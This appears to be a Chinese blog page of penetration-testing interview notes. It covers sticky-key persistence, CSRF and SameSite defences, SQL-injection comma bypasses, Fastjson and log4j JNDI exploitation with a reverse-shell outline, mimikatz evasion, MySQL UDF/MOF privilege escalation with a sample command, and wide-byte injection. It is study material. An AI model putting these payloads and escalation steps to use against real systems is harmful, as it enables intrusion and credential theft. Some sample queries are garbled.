<h2 id="12-权限维持"><a href="#12-权限维持" class="headerlink" title="12.权限维持"></a>12.权限维持</h2><p>msf里的use post&#x2F;windows&#x2F;manage&#x2F;sticky_keys</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\sethc.exe 粘滞键 快捷键：按五次 shift 键；</span><br><span class="line">C:\Windows\System32\utilman.exe 设置中心 快捷键：Windows+U 键；</span><br><span class="line">C:\Windows\System32\osk.exe 屏幕键盘</span><br></pre></td></tr></table></figure>

<p>计划任务windows的2007之前的at2008之后的schtaskslinux计划任务为crontab命令</p>
<h2 id="13-xss之href输出防护"><a href="#13-xss之href输出防护" class="headerlink" title="13.xss之href输出防护"></a>13.xss之href输出防护</h2><p>在输入的时候只允许http和https的协议</p>
<h2 id="14-samesite防御CSRF的原理"><a href="#14-samesite防御CSRF的原理" class="headerlink" title="14.samesite防御CSRF的原理"></a>14.samesite防御CSRF的原理</h2><p>三个属性</p>
<p>Lax:b通过超连接访问a，携带a的cookie，b通过img标签访问a，不带cookie，设置的cookie不起作用</p>
<p>Strict：b通过超连接访问a，不会携带a的cookie，b通过img标签访问a，不带cookie，设置的cookie不起作用。</p>
<ol>
<li>get类型的csrf漏洞原本可以用img&#x2F;script等标签进行攻击，但是由于SameSite&#x3D;Lax属性，攻击无效，只能通过访问超连接进行攻击</li>
<li>post类型的csrf漏洞，ajax可以完成content-type为application&#x2F;x-www-form-urlencoded的csrf攻击，form表单也可以进行攻击，由于SameSite&#x3D;Lax属性，只能通过form表单提交到新页面进行攻击。</li>
</ol>
<h2 id="15-json格式的CSRF如何防御"><a href="#15-json格式的CSRF如何防御" class="headerlink" title="15.json格式的CSRF如何防御"></a>15.json格式的CSRF如何防御</h2><ol>
<li>验证用户，提交数据的时候输入验证码</li>
<li>验证请求来源的refer</li>
<li>表单token验证</li>
</ol>
<h2 id="16-浏览器解析顺序和解码顺序"><a href="#16-浏览器解析顺序和解码顺序" class="headerlink" title="16.浏览器解析顺序和解码顺序"></a>16.浏览器解析顺序和解码顺序</h2><p>解析顺序</p>
<ol>
<li>浏览器接收到响应数据后，解析器先对HTML之类的文档进行解析，构建成DOM节点树，同时，CSS会被CSS解析器解析生成样式表。</li>
<li>解析html标签过程中遇到<script>标签，则暂停HTML标签解析，控制权转交给<a href="https://cloud.tencent.com/product/sms?from=10680">JavaScript</a>引擎，执行完后继续解析html，js可以对DOM进行修改。</li>
</ol>
<p>解码顺序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">浏览器一般的解码顺序是先进行html解码，再进行javascript解码，最后再进行url解码，需要注意的是这里的url解码和我们发送到服务器的url解码不同，那个过程是由服务器来完成的，而不是浏览器。</span><br></pre></td></tr></table></figure>



<h2 id="17-过滤逗号的SQL注入如何绕过过滤limit后的逗号如何绕过"><a href="#17-过滤逗号的SQL注入如何绕过过滤limit后的逗号如何绕过" class="headerlink" title="17.过滤逗号的SQL注入如何绕过过滤limit后的逗号如何绕过"></a>17.过滤逗号的SQL注入如何绕过过滤limit后的逗号如何绕过</h2><p>在使用盲注的时候，需要使用到substr() .mid() ,limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用fromto的方式来解决。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select substr(database(O from 1 for 1);</span><br><span class="line">select mid(database(O from 1 for 1);对于limit可以使用offset来绕过。</span><br><span class="line">select * from news limit 0,1#等价于下面这条SQL语句</span><br><span class="line">select * from news limit 1 offset o小结:使用from可以绕过逗号</span><br></pre></td></tr></table></figure>



<h2 id="18-Fastjson漏洞"><a href="#18-Fastjson漏洞" class="headerlink" title="18.Fastjson漏洞"></a>18.Fastjson漏洞</h2><p>提供了autoType功能，允许用户在反序列化数据中通过@type指定反序列化的类型，所以黑客可以构造数据，使目标应用的代码执行流程进入特定的类的settergetter方法中，从而造成攻击。</p>
<p>反序列化有两种利用方式，rmi(远程方法调用)ldap（轻量级目录访问协议）</p>
<p>exp 用java编译为class文件上传到VP-s上，然后在目录下运行python -m ip port搭建一个web服务，接受ldap的重定向请求。然后使用github上的一个工具，marshalsec ，maven生成jar包，进入这个工具目录，工具启动ldap服务，然后nc监听。反弹shell。</p>
<h2 id="19-log4j漏洞"><a href="#19-log4j漏洞" class="headerlink" title="19.log4j漏洞"></a>19.log4j漏洞</h2><p>Apache Log4j 2是一个开源的日志记录组件，使用非常的广泛。黑客通过JNDI注入实现攻击。</p>
<p>当log4j打印的日志内容中包括 ${jndi:ldap://ip}时，程序就会通过Idap协议访问ip这个地址，然后ip就会返回一个包含Java代码的class文件的地址，然后程序再通过返回的地址下载class文件并执行。</p>
<p>创建maven项目，导入log4j的依赖，找了一个exp，编译成class文件，开启ldap服务，运行log4j.java,即可成功。</p>
<h2 id="20-mimikatz免杀"><a href="#20-mimikatz免杀" class="headerlink" title="20.mimikatz免杀"></a>20.mimikatz免杀</h2><ol>
<li>替换资源+加壳+签名vpm加壳</li>
</ol>
<h2 id="21-判断是windows还是linux"><a href="#21-判断是windows还是linux" class="headerlink" title="21.判断是windows还是linux"></a>21.判断是windows还是linux</h2><p>linux大小写敏感，windows大小写不敏感</p>
<h2 id="22-Mysql两种提权方式"><a href="#22-Mysql两种提权方式" class="headerlink" title="22.Mysql两种提权方式"></a>22.Mysql两种提权方式</h2><p>UDF提权</p>
<ol>
<li><p>目标系统是windows</p>
</li>
<li><p>拥有mysql的用户账号，可以使用insert、delete权限</p>
</li>
<li><p>有root账号密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.mysql&lt;5.1导出目录c:/windows或 system32</span><br><span class="line">2.mysql=&gt;5.1导出安装目录/lib/plugin/</span><br></pre></td></tr></table></figure></li>
</ol>
<p>流程：将udf文件放到指定位置，引入自定义函数，执行自定义函数。</p>
<p>MOF提权</p>
<ol>
<li>select load file('c:/wmpub/nullevt.mof') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mov'</li>
<li>执行成功后，即可添加一个普通用户，更改命令，再上传导出执行把用户提升到管理员权限，然后连接3389连接</li>
</ol>
<h2 id="23-宽字节注入"><a href="#23-宽字节注入" class="headerlink" title="23.宽字节注入"></a>23.宽字节注入</h2><p>魔术引号开关</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">magic_quotes_gpc,对用户post、get、cookie提交的数据增加转义字符\</span><br><span class="line">单引号，双引号，反斜线都会被加上反斜线</span><br></pre></td></tr></table></figure>

<p>gbk编码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\是%5c，可以使用%df吃掉%5c，因为它俩加起来是个汉字</span><br></pre></td></tr></table></figure>

<p>有关函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php中存在一个addslashes()函数，添加反斜杠</span><br><span class="line">在数据进入服务器之前，mysql_query(“SET NAMES gbk”);将MySQL的三个字符集设置为 gbk 编码</span><br><span class="line">character_set_client告诉MySQL Server，传入的是gbk编码，也就是’被当做了%5C%27传入</span><br><span class="line">character_set_connection-&gt; table charset这里我们需要关注下所使用的表的字符集</span><br></pre></td></tr></table></figure>



<h2 id="24-代理转发工具"><a href="#24-代理转发工具" class="headerlink" title="24.代理转发工具"></a>24.代理转发工具</h2><p>内网穿透工具frp、</p>
]]></content>
      <categories>
        <category>面试</category>
      </categories>
      <tags>
        <tag>杂识</tag>
      </tags>
  </entry>
</search>
